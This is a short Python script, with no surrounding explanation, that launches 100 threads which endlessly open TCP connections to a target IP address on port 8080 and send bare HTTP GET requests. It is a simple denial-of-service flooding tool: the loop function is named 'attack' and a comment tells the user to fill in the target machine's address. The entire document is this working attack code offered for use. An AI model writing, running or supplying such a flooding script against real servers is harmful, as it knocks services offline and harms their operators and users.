import socket
import threading

target_ip = "111.11.11.111"  # Replace with the IP address of the target machine
target_port = 8080

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
        s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
        s.close()

# Number of threads to launch
num_threads = 100

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()